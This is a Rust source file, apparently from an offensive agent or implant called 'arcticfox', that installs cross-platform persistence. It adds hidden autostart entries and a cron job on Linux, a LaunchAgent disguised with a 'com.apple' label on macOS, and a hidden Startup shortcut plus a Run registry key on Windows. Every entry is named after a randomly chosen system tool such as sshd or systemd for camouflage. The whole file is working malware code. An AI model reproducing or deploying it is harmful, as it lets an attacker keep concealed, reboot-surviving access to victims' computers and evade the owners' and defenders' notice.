//! Persistence: cross-platform agent installation for survivability.
//!
//! Installs the agent to survive reboots:
//! - Linux: autostart .desktop + cron job
//! - macOS: LaunchAgent plist
//! - Windows: Startup folder shortcut + registry

use std::path::{Path, PathBuf};
use tracing::{info, warn};

use arcticfox_core::error::Result;

/// Tool names used for camouflage (mimics system tools).
const CAMO_NAMES: &[&str] = &[
    "systemd", "cron", "bash", "sshd", "networkd",
    "apt", "dpkg", "iptables", "journald", "udev",
];

/// Install cross-platform persistence for the agent.
///
/// `agent_path` should be the absolute path to the agent binary.
/// `config_path` should be the absolute path to the config file.
pub fn install_persistence(agent_path: &Path, config_path: &Path) -> Result<()> {
    info!("Installing persistence...");

    #[cfg(target_os = "linux")]
    {
        install_linux_autostart(agent_path)?;
        install_linux_cron(agent_path, config_path)?;
    }

    #[cfg(target_os = "macos")]
    {
        install_macos_launchagent(agent_path, config_path)?;
    }

    #[cfg(target_os = "windows")]
    {
        install_windows_startup(agent_path)?;
        install_windows_registry(agent_path)?;
    }

    info!("Persistence installed");
    Ok(())
}

/// Linux: create a .desktop autostart entry with a camouflaged name.
#[cfg(target_os = "linux")]
fn install_linux_autostart(agent_path: &Path) -> Result<()> {
    let autostart_dir = dirs_autostart()?;
    std::fs::create_dir_all(&autostart_dir).ok();

    let name = pick_camo_name();
    let desktop_path = autostart_dir.join(format!("{}.desktop", name));

    let content = format!(
        "[Desktop Entry]\n\
         Type=Application\n\
         Name={}\n\
         Exec={}\n\
         Hidden=true\n\
         NoDisplay=true\n\
         X-GNOME-Autostart-enabled=true\n",
        name,
        agent_path.display(),
    );

    std::fs::write(&desktop_path, &content).map_err(|e| {
        arcticfox_core::error::ArcticFoxError::FileWrite {
            path: desktop_path,
            source: e,
        }
    })?;

    info!("Linux autostart installed: {}", name);
    Ok(())
}

/// Linux: install a cron job that re-runs the agent periodically.
#[cfg(target_os = "linux")]
fn install_linux_cron(agent_path: &Path, config_path: &Path) -> Result<()> {
    let name = pick_camo_name();
    let cron_entry = format!(
        "*/30 * * * * {} agent --config {} --daemon > /dev/null 2>&1 # {} maintenance\n",
        agent_path.display(),
        config_path.display(),
        name,
    );

    // Append to user's crontab
    let output = std::process::Command::new("crontab")
        .arg("-l")
        .output();

    let existing = match output {
        Ok(out) => String::from_utf8_lossy(&out.stdout).to_string(),
        Err(_) => String::new(),
    };

    if !existing.contains(agent_path.to_str().unwrap_or("")) {
        let new_crontab = format!("{}{}", existing, cron_entry);
        
        let mut child = std::process::Command::new("crontab")
            .arg("-")
            .stdin(std::process::Stdio::piped())
            .spawn()
            .map_err(|e| arcticfox_core::error::ArcticFoxError::CommandExec {
                reason: format!("Failed to spawn crontab: {e}"),
            })?;

        use std::io::Write;
        if let Some(mut stdin) = child.stdin.take() {
            stdin.write_all(new_crontab.as_bytes()).ok();
        }

        let status = child.wait().ok();
        if status.map_or(false, |s| s.success()) {
            info!("Cron persistence installed");
        } else {
            warn!("Cron installation may have failed (non-root?)");
        }
    }

    Ok(())
}

/// Linux: get the user's autostart directory.
#[cfg(target_os = "linux")]
fn dirs_autostart() -> Result<PathBuf> {
    let config_home = std::env::var("XDG_CONFIG_HOME")
        .unwrap_or_else(|_| {
            let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
            format!("{}/.config", home)
        });
    Ok(PathBuf::from(config_home).join("autostart"))
}

/// macOS: create a LaunchAgent plist.
#[cfg(target_os = "macos")]
fn install_macos_launchagent(agent_path: &Path, config_path: &Path) -> Result<()> {
    let name = pick_camo_name();
    let label = format!("com.apple.{}.helper", name);
    let plist_dir = PathBuf::from(
        std::env::var("HOME").unwrap_or_else(|_| "/Users/Shared".into())
    ).join("Library/LaunchAgents");

    std::fs::create_dir_all(&plist_dir).ok();

    let plist_path = plist_dir.join(format!("{}.plist", label));
    let plist_content = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{agent_path}</string>
        <string>agent</string>
        <string>--config</string>
        <string>{config_path}</string>
        <string>--daemon</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>ThrottleInterval</key>
    <integer>60</integer>
</dict>
</plist>"#,
        label = label,
        agent_path = agent_path.display(),
        config_path = config_path.display(),
    );

    std::fs::write(&plist_path, &plist_content).map_err(|e| {
        arcticfox_core::error::ArcticFoxError::FileWrite {
            path: plist_path,
            source: e,
        }
    })?;

    // Load the agent
    let _ = std::process::Command::new("launchctl")
        .args(["load", plist_path.to_str().unwrap_or("")])
        .output();

    info!("macOS LaunchAgent installed: {}", label);
    Ok(())
}

/// Windows: create a Startup folder shortcut.
#[cfg(target_os = "windows")]
fn install_windows_startup(agent_path: &Path) -> Result<()> {
    let startup = PathBuf::from(
        std::env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Default".into())
    ).join("Microsoft\\Windows\\Start Menu\\Programs\\Startup");

    std::fs::create_dir_all(&startup).ok();

    let name = pick_camo_name();
    let lnk_path = startup.join(format!("{}.lnk", name));

    // Use PowerShell to create shortcut
    let ps_script = format!(
        "$WshShell = New-Object -ComObject WScript.Shell; \
         $Shortcut = $WshShell.CreateShortcut('{}'); \
         $Shortcut.TargetPath = '{}'; \
         $Shortcut.WindowStyle = 7; \
         $Shortcut.Save()",
        lnk_path.display(),
        agent_path.display(),
    );

    let _ = std::process::Command::new("powershell")
        .args(["-NoProfile", "-Command", &ps_script])
        .output();

    info!("Windows startup shortcut installed");
    Ok(())
}

/// Windows: add a registry Run key.
#[cfg(target_os = "windows")]
fn install_windows_registry(agent_path: &Path) -> Result<()> {
    let name = pick_camo_name();
    let key = format!(
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{}",
        name
    );
    let value = agent_path.display().to_string();

    let _ = std::process::Command::new("reg")
        .args(["add", &key, "/v", &name, "/t", "REG_SZ", "/d", &value, "/f"])
        .output();

    info!("Windows registry persistence installed");
    Ok(())
}

/// Pick a random camouflaged name from the system-tool list.
fn pick_camo_name() -> String {
    use rand::Rng;
    let idx = rand::thread_rng().gen_range(0..CAMO_NAMES.len());
    CAMO_NAMES[idx].to_string()
}
